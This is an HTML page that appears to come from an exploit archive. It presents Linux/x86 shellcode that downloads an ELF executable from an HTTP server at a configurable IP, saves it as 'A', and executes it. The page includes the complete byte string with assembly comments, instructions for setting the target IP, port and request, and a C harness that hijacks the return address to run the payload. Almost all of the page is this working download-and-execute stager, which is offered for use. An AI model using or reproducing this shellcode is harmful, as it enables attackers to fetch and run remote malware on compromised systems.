<html><head><title>Linux/x86 - HTTP/1.x GET, Downloads &amp; execve() - 111 bytes+</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * (linux/x86) - HTTP/1.x GET, Downloads and execve() - 111 bytes+
 *
 * This shellcode allows you to download a ELF executable straight off a standard HTTP server
 * and launch it. It will saved locally it into a filename called 'A' in the current directory.
 * 
 * &lt;_CONFIGURATION&gt;
 *
 * &gt; The destination IP of the HTTP server is required (NO DNS!), use inet_addr() function result and 
 *   modify the value in [1*] from 0xdeadbeef to the actual IP, if the IP contains NULLs then a little 
 *   workaround requires. The simplest is to use ~inet_addr() followed by ``notl (%esp)`` to change back. 
 *
 * &gt; The destination port of the HTTP server is 80 by default, it is located within the 4 upper bytes
 *   of the value in [2*] (0xafff). Stored in an invert format (~), so if any further modification 
 *   needed make sure to keep it stored in the same format.
 *
 * &gt; The destination URL should be generated using the ``gen_httpreq`` utility. It will produce an
 *   assembly code which is a series of PUSH's and should be pasted as it is within in the marked place
 *   in the shellcode (look for the comment).
 * 
 * &lt;_LINKS/UTILITIES&gt;:
 *
 *      gen_httpreq.c, generates a HTTP GET request for this shellcode
 *      &gt; http://www.tty64.org/code/shellcodes/utilities/gen_httpreq.c
 *	backup
 *	&gt; http://www.milw0rm.com/shellcode/2618
 *
 * - izik &lt; izik@tty64.org &gt;
 */

char shellcode[] = 

	&quot;\x6a\x66&quot;              // push $0x66 
	&quot;\x58&quot;                  // pop %eax 
	&quot;\x99&quot;                  // cltd 
	&quot;\x6a\x01&quot;              // push $0x1 
	&quot;\x5b&quot;                  // pop %ebx 
	&quot;\x52&quot;                  // push %edx 
	&quot;\x53&quot;                  // push %ebx 
	&quot;\x6a\x02&quot;              // push $0x2 
	&quot;\x89\xe1&quot;              // mov %esp,%ecx 
	&quot;\xcd\x80&quot;              // int $0x80 
	&quot;\x5b&quot;                  // pop %ebx 
	&quot;\x5e&quot;                  // pop %esi 
	&quot;\x68\xef\xbe\xad\xde&quot;  // [1*] push $0xdeadbeef
	&quot;\xbd\xfd\xff\xff\xaf&quot;  // [2*] mov $0xaffffffd,%ebp 
	&quot;\xf7\xd5&quot;              // not %ebp 
	&quot;\x55&quot;                  // push %ebp 
	&quot;\x43&quot;                  // inc %ebx 
	&quot;\x6a\x10&quot;              // push $0x10 
	&quot;\x51&quot;                  // push %ecx 
	&quot;\x50&quot;                  // push %eax 
	&quot;\xb0\x66&quot;              // mov $0x66,%al 
	&quot;\x89\xe1&quot;              // mov %esp,%ecx 
	&quot;\xcd\x80&quot;              // int $0x80 
	&quot;\x5f&quot;                  // pop %edi 
	&quot;\xb0\x08&quot;              // mov $0x8,%al 
	&quot;\x52&quot;                  // push %edx 
	&quot;\x6a\x41&quot;              // push $0x41 
	&quot;\x89\xe3&quot;              // mov %esp,%ebx 
	&quot;\x50&quot;                  // push %eax 
	&quot;\x59&quot;                  // pop %ecx 
	&quot;\xcd\x80&quot;              // int $0x80 
	&quot;\x96&quot;                  // xchg %eax,%esi 
	&quot;\x87\xdf&quot;              // xchg %ebx,%edi 

	//
	// &lt;_paste here the code, that gen_httpreq.c outputs!&gt;
	//

	&quot;\xb0\x04&quot;              // mov $0x4,%al 

	//
	// &lt;_send_http_request&gt;:
	//

	&quot;\x89\xe1&quot;              // mov %esp,%ecx 
	&quot;\xcd\x80&quot;              // int $0x80 
	&quot;\x99&quot;                  // cltd 
	&quot;\x42&quot;                  // inc %edx 

	//
	// &lt;_wait_for_dbl_crlf&gt;:
	//

	&quot;\x49&quot;                  // dec %ecx 
	&quot;\xb0\x03&quot;              // mov $0x3,%al 
	&quot;\xcd\x80&quot;              // int $0x80 
	&quot;\x81\x39\x0a\x0d\x0a\x0d&quot; // cmpl $0xd0a0d0a,(%ecx) 
	&quot;\x75\xf3&quot;              // jne &lt;_wait_for_dbl_crlf&gt; 
	&quot;\xb2\x04&quot;              // mov $0x4,%dl 

	//
	// &lt;_dump_loop_do_read&gt;:
	//

	&quot;\xb0\x03&quot;              // mov $0x3,%al 
	&quot;\xf8&quot;                  // clc 


	//
	// &lt;_dump_loop_do_write&gt;:
	//

	&quot;\xcd\x80&quot;              // int $0x80 
	&quot;\x87\xde&quot;              // xchg %ebx,%esi 
	&quot;\x72\xf7&quot;              // jb &lt;_dump_loop_do_read&gt; 
	&quot;\x85\xc0&quot;              // test %eax,%eax 
	&quot;\x74\x05&quot;              // je &lt;_close_file&gt; 
	&quot;\xb0\x04&quot;              // mov $0x4,%al 
	&quot;\xf9&quot;                  // stc 
	&quot;\xeb\xf1&quot;              // jmp &lt;_dump_loop_do_write&gt; 
	&quot;\xb0\x06&quot;              // mov $0x6,%al 
	&quot;\xcd\x80&quot;              // int $0x80 
	&quot;\x99&quot;                  // cltd 
	&quot;\xb0\x0b&quot;              // mov $0xb,%al 
	&quot;\x89\xfb&quot;              // mov %edi,%ebx 
	&quot;\x52&quot;                  // push %edx 
	&quot;\x53&quot;                  // push %ebx 
	&quot;\xeb\xcc&quot;;             // jmp &lt;_send_http_request&gt; 

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&amp;ret + 2;
	(*ret) = (int) shellcode;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
